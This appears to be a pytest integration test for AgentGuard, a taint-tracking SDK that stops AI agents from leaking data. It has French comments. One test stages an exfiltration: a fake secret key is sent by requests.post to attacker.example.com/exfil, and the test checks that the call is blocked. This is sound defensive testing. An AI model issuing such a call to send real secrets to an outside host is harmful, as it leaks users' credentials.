"""
tests/test_uninstrumented_leak.py

Test d'intégration prouvant que le système bloque les fuites de données
même en l'absence de décorateurs explicites (@guard.guard_tool_call),
grâce à l'auto-instrumentation et au principe "Taint by Default".

IMPORTANT :
- Ne jamais mocker requests.post / requests.get au niveau du module.
- Intercepter HTTPAdapter.send pour conserver la chaîne d'auto-instrumentation.
- Utiliser de véritables objets requests.Response.
- Distinguer les requêtes HTTP métier des requêtes internes du SDK.
"""

import io
from unittest.mock import patch

import pytest
import requests
import requests.structures

from agentguard import AgentGuard
from agentguard.auto_instrument import (
    enable_auto_instrumentation,
    set_taint_tracker,
)
from agentguard.exceptions import SecurityException


def _fake_response(url: str, body: bytes = b'{"status": "ok"}'):
    """Construit une véritable Response HTTP 200."""
    resp = requests.models.Response()
    resp.status_code = 200
    resp.url = url
    resp._content = body
    resp.raw = io.BytesIO(body)
    resp.headers = requests.structures.CaseInsensitiveDict(
        {"Content-Type": "application/json"}
    )
    return resp


class TestUninstrumentedLeakPrevention:
    """Vérifie la résilience du système face aux oublis d'instrumentation."""

    @pytest.fixture(autouse=True)
    def setup_auto_instrumentation(self):
        """Configure l'auto-instrumentation avant chaque test."""

        self.guard = AgentGuard(
            collector_url="http://mock-collector",
            api_key="ag-test-key",
            agent_id="test-agent",
        )

        set_taint_tracker(self.guard.taint_tracker)
        enable_auto_instrumentation()

        try:
            yield
        finally:
            # Évite de conserver un tracker entre deux tests.
            set_taint_tracker(None)

    def test_blocked_exfiltration_without_decorator(self):
        """
        SCÉNARIO :
        Un développeur oublie de décorer une fonction.
        L'agent lit un secret puis tente de l'envoyer via requests.post.

        RÉSULTAT ATTENDU :
        L'auto-instrumentation intercepte et bloque l'appel
        avant toute transmission réseau.
        """

        secret_data = "SUPER_SECRET_API_KEY_12345"

        self.guard.taint_tracker.mark_as_tainted(
            secret_data,
            level="SECRET",
        )

        network_calls = []

        def fake_send(adapter, request, **kwargs):
            network_calls.append(request)
            return _fake_response(request.url)

        with (
            patch(
                "requests.adapters.HTTPAdapter.send",
                new=fake_send,
            ),
            pytest.raises(SecurityException) as exc_info,
        ):
            requests.post(
                url="https://attacker.example.com/exfil",
                json={"payload": secret_data},
            )

        assert "BLOCK" in str(exc_info.value)
        assert "exfiltration" in str(exc_info.value).lower()

        # Aucune requête vers l'adaptateur ne doit avoir été envoyée.
        assert network_calls == []

    def test_allowed_safe_data_without_decorator(self):
        """
        SCÉNARIO :
        Un développeur envoie des données publiques non contaminées.

        RÉSULTAT ATTENDU :
        La requête POST métier réussit normalement.
        Les éventuelles requêtes internes du SDK ne doivent pas
        être confondues avec la requête métier.
        """

        safe_data = {
            "message": "Hello World, this is public info",
        }

        network_calls = []

        def fake_send(adapter, request, **kwargs):
            network_calls.append(request)
            return _fake_response(request.url)

        with patch(
            "requests.adapters.HTTPAdapter.send",
            new=fake_send,
        ):
            response = requests.post(
                url="https://api.example.com/public-endpoint",
                json=safe_data,
            )

        assert response.status_code == 200
        assert response.json() == {"status": "ok"}

        # On vérifie spécifiquement la requête métier.
        business_calls = [
            request
            for request in network_calls
            if request.url == "https://api.example.com/public-endpoint"
            and request.method == "POST"
        ]

        assert len(business_calls) == 1

        # Vérifie qu'aucune autre requête métier n'a été envoyée.
        assert all(
            request.url == "https://api.example.com/public-endpoint"
            for request in business_calls
        )
